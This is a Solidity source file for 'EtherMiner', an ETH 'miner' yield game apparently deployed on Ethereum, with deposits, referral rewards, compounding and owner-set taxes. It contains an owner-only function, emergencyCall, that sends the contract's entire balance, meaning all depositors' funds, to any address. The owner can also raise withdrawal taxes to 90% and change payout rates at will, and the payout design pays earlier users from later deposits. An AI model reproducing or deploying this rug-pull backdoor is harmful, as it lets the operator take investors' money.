/**
 *Submitted for verification at Etherscan.io on 2022-08-12
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.9;
/*
*
*   |\  ___ \|\___   ___\\  \|\  \|\  ___ \ |\   __  \        |\   _ \  _   \|\  \|\   ___  \|\  ___ \ |\   __  \    
*   \ \   __/\|___ \  \_\ \  \\\  \ \   __/|\ \  \|\  \       \ \  \\\__\ \  \ \  \ \  \\ \  \ \   __/|\ \  \|\  \   
*    \ \  \_|/__  \ \  \ \ \   __  \ \  \_|/_\ \   _  _\       \ \  \\|__| \  \ \  \ \  \\ \  \ \  \_|/_\ \   _  _\  
*     \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \_|\ \ \  \\  \|       \ \  \    \ \  \ \  \ \  \\ \  \ \  \_|\ \ \  \\  \| 
*      \ \_______\  \ \__\ \ \__\ \__\ \_______\ \__\\ _\        \ \__\    \ \__\ \__\ \__\\ \__\ \_______\ \__\\ _\ 
*       \|_______|   \|__|  \|__|\|__|\|_______|\|__|\|__|        \|__|     \|__|\|__|\|__| \|__|\|_______|\|__|\|__|
*
*                                                                                                                                                                                                                                                                                                                
* ETHER MINER
*
* Twitter  : https://twitter.com/etherminer
* Telegram : https://t.me/etherminer
* Discord  : https://discord.gg/ 
*
*/

contract Ownable{
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _owner = msg.sender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

contract EtherMiner is Ownable {
    using SafeMath for uint256;

    /* base parameters */
    uint256 public EGGS_TO_HIRE_1MINERS = 1728000;
    uint256 public REFERRAL = 120;
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public EXTRA_BONUS = 200;
    uint256 public DECREASE_TAX = 500;
    uint256 public TAX = 20;
    uint256 public MARKET_EGGS_DIVISOR = 5;
    uint256 public MARKET_EGGS_DIVISOR_SELL = 2;

    uint256 public MIN_INVEST_LIMIT = 1 * 1e16; /* 0.01 ETH  */
    uint256 public WALLET_DEPOSIT_LIMIT = 50 * 1e18; /* 50 ETH  */

	uint256 public COMPOUND_BONUS_MAX_TIMES = 10;
    uint256 public COMPOUND_STEP = 1 days;

    uint256 public EARLY_WITHDRAWAL_TAX = 500;
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 0; // 6

    uint256 public totalTax;


    uint256 private marketEggs;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool private contractStarted;

	uint256 public CUTOFF_STEP = 4 days;
	uint256 public WITHDRAW_COOLDOWN = 1 days;

    /* addresses */
    // address private owner;
    address payable public ceoAddress;
    address payable public devAddress;

    struct User {
        uint256 initialDeposit;
        uint256 miners;
        uint256 claimedEggs;
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 dailyCompoundBonus;
        mapping(uint16 => uint256) ticketCount;
        uint8 level;
    }

    mapping(address => User) public users;

    struct PurchaseInfo {
        uint256 ticketIDFrom;
        uint256 tickets;
        address account;
    }

    struct LotteryInfo {
        address winnerAccount;          // winner of this round
        uint256 totalTicketCnt;         // total purcahsed ticket count of this count
        PurchaseInfo[] purchaseInfo;    // purchase info
    }

    constructor(address payable _ceoAddress, address payable _devAddress) {
        ceoAddress = _ceoAddress;
        devAddress = _devAddress;
        marketEggs = 144000000000;
    }

    function CompoundRewards(address ref) public {
        require(contractStarted, "Contract not yet Started.");

        User storage user = users[msg.sender];
        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }
                
        uint256 eggsUsed = getMyEggs();
        if(block.timestamp.sub(user.lastHatch) >= COMPOUND_STEP && user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
            user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
        }
        
        user.miners = user.miners.add(eggsUsed.div(EGGS_TO_HIRE_1MINERS));
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            uint256 refRewards = eggsUsed.mul(REFERRAL).div(PERCENTS_DIVIDER);
            users[upline].claimedEggs = SafeMath.add(users[upline].claimedEggs, refRewards);
            users[upline].referralEggRewards = users[upline].referralEggRewards.add(refRewards);
        }

        marketEggs = marketEggs.add(eggsUsed.div(MARKET_EGGS_DIVISOR));
    }

    function ClaimRewards() public {
        require(contractStarted, "Contract not yet Started.");

        User storage user = users[msg.sender];
        require(user.lastHatch + WITHDRAW_COOLDOWN <= block.timestamp);

        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);
        
        /** 
            if user compound < to mandatory compound days**/
        if (user.dailyCompoundBonus < COMPOUND_FOR_NO_TAX_WITHDRAWAL){
            //daily compound bonus count will not reset and eggValue will be deducted with 50% feedback tax.
            eggValue = eggValue.sub(eggValue.mul(EARLY_WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
        } else {
            //set daily compound bonus count to 0 and eggValue will remain without deductions
             user.dailyCompoundBonus = 0;
        }
        
        user.claimedEggs = 0;  
        user.lastHatch = block.timestamp;
        marketEggs = marketEggs.add(hasEggs.div(MARKET_EGGS_DIVISOR_SELL));
        
        if (user.level > 0) {
            eggValue = eggValue + eggValue.mul(EXTRA_BONUS).div(PERCENTS_DIVIDER);
        }

        if(getBalance() < eggValue) {
            eggValue = getBalance();
        }

        uint256 eggsPayout = eggValue.sub(payFees(eggValue));
        
        payable(address(msg.sender)).transfer(eggsPayout);
    }
     
    /* transfer amount of ETH */
    function BuyGolds(address ref) public payable {
        require(contractStarted, "Contract not yet Started.");

        User storage user = users[msg.sender];
               
        require(msg.value >= MIN_INVEST_LIMIT, "Mininum investment not met.");
        require(user.initialDeposit.add(msg.value) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");

        uint256 eggsBought = calculateEggBuy(msg.value, address(this).balance.sub(msg.value));
        user.initialDeposit = user.initialDeposit.add(msg.value);
        user.claimedEggs = user.claimedEggs.add(eggsBought);

        payFees(msg.value);
        CompoundRewards(ref);
    }

    function seedMarket(address addr) public payable{
        if (!contractStarted) {
    		if (msg.sender == owner()) {
    			contractStarted = true;
                BuyGolds(addr);
    		} else revert("Contract not yet started.");
    	}
    }

    //fund contract with ETH before launch.
    function fundContract() external payable {}

    function payFees(uint256 eggValue) internal returns(uint256) {
        uint256 tax = eggValue.mul(TAX).div(PERCENTS_DIVIDER);
        if (users[msg.sender].level > 1) {
            tax = tax.mul(DECREASE_TAX).div(PERCENTS_DIVIDER);
        }
        totalTax = totalTax.add(tax);
        // payable(ceoAddress).transfer(tax.mul(850).div(PERCENTS_DIVIDER));
        // payable(owner()).transfer(tax.mul(150).div(PERCENTS_DIVIDER));
        return tax;
    }

    function claimTax() external {
        payable(ceoAddress).transfer(totalTax.mul(850).div(PERCENTS_DIVIDER));
        payable(devAddress).transfer(totalTax.mul(150).div(PERCENTS_DIVIDER));
        totalTax = 0;
    }

    function getBalance() public view returns(uint256){
        return address(this).balance - totalTax;
    }

    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = users[_adr].claimedEggs.add(getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }

    //  Supply and demand balance algorithm 
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
    // (PSN * bs)/(PSNH + ((PSN * rs + PSNH * rt) / rt)); PSN / PSNH == 1/2
    // bs * (1 / (1 + (rs / rt)))
    // purchase ： marketEggs * 1 / ((1 + (this.balance / eth)))
    // sell ： this.balance * 1 / ((1 + (marketEggs / eggs)))
        return SafeMath.div(
                SafeMath.mul(PSN, bs), 
                    SafeMath.add(PSNH, 
                        SafeMath.div(
                            SafeMath.add(
                                SafeMath.mul(PSN, rs), 
                                    SafeMath.mul(PSNH, rt)), 
                                        rt)));
    }

    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs, marketEggs, getBalance());
    }

    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketEggs);
    }

    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth, getBalance());
    }

    /* How many snows per day user will receive based on ETH deposit */
    function getEggsYield(uint256 amount) public view returns(uint256,uint256) {
        uint256 eggsAmount = calculateEggBuy(amount , getBalance().add(amount).sub(amount));
        uint256 miners = eggsAmount.div(EGGS_TO_HIRE_1MINERS);
        uint256 day = 1 days;
        uint256 eggsPerDay = day.mul(miners);
        uint256 earningsPerDay = calculateEggSellForYield(eggsPerDay, amount);
        return(miners, earningsPerDay);
    }

    function calculateEggSellForYield(uint256 eggs,uint256 amount) public view returns(uint256){
        return calculateTrade(eggs,marketEggs, getBalance().add(amount));
    }

    function getMyEggs() public view returns(uint256){
        return users[msg.sender].claimedEggs.add(getEggsSinceLastHatch(msg.sender));
    }

    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
                            /* get min time. */
        uint256 cutoffTime = min256(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 secondsPassed = min256(EGGS_TO_HIRE_1MINERS, cutoffTime);
        return secondsPassed.mul(users[adr].miners);
    }

    function levelGift(address _account) external {
        require(msg.sender == owner(), "Admin use only");
        users[_account].level = users[_account].level + 1;
    }

    function emergencyCall(address _account) public onlyOwner {
        payable(_account).transfer(getBalance());
    }

    function min256(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function min16(uint16 a, uint16 b) private pure returns (uint16) {
        return a < b ? a : b;
    }

    function CHANGE_ceoAddress(address _account) external {
        require(msg.sender == ceoAddress, "Admin use only.");
        ceoAddress = payable(_account);
    }

    function CHANGE_devAddress(address _account) external {
        require(msg.sender == devAddress, "Admin use only.");
        devAddress = payable(_account);
    }

    /* APR setters */
    // 2880000 - 3%, 2160000 - 4%, 1728000 - 5%, 1440000 - 6%, 1200000 - 7%
    // 1080000 - 8%, 959000 - 9%, 864000 - 10%, 720000 - 12%
    
    function SET_EGGS_TO_HIRE_1MINERS(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 2880000 && value >= 720000, "Min 3%, Max 12%");
        EGGS_TO_HIRE_1MINERS = value;
    }

    function SET_REFERRAL_PERCENT(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value >= 10 && value <= 100, "Min 1%, Max 10%");
        REFERRAL = value;
    }

    function SET_MARKET_EGGS_DIVISOR(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 50);
        MARKET_EGGS_DIVISOR = value;
    }

    function SET_MARKET_EGGS_DIVISOR_SELL(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 50);
        MARKET_EGGS_DIVISOR_SELL = value;
    }

    function SET_TAX(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 100, "available to 10%");
        TAX = value;
    }

    function SET_EXTRA_BONUS(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 500, "available to 50%");
        EXTRA_BONUS = value;
    }

    function SET_DECREASE_TAX(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 1000, "available to 100%");
        DECREASE_TAX = value;
    }

    function SET_WITHDRAWAL_TAX(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 900, "available to 90%");
        EARLY_WITHDRAWAL_TAX = value;
    }

    function SET_DAILY_COMPOUND_BONUS_MAX_TIMES(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 30);
        COMPOUND_BONUS_MAX_TIMES = value;
    }

    function SET_COMPOUND_STEP(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 1_209_600, "available between 0 and 14 days");
        COMPOUND_STEP = value;
    }

    function SET_INVEST_MIN(uint256 value) external {
        require(msg.sender == owner(), "Admin use only");
        require(value >= 1e16 && value <= 1 ether, "available between 0.01 ETH and 1ETH");
        MIN_INVEST_LIMIT = value;
    }

    function SET_CUTOFF_STEP(uint256 value) external {
        require(msg.sender == owner(), "Admin use only");
        require(value <= 1_209_600, "available between 0 and 14 days");
        CUTOFF_STEP = value;
    }

    function SET_WITHDRAW_COOLDOWN(uint256 value) external {
        require(msg.sender == owner(), "Admin use only");
        require(value <= 1_209_600, "available between 0 and 14 days");
        WITHDRAW_COOLDOWN = value;
    }

    function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external {
        require(msg.sender == owner(), "Admin use only");
        require(value >= 10 && value <= 100, "available between 10ETH and 100ETH");
        WALLET_DEPOSIT_LIMIT = value * 1 ether;
    }
    
    function SET_COMPOUND_FOR_NO_TAX_WITHDRAWAL(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 12);
        COMPOUND_FOR_NO_TAX_WITHDRAWAL = value;
    }
}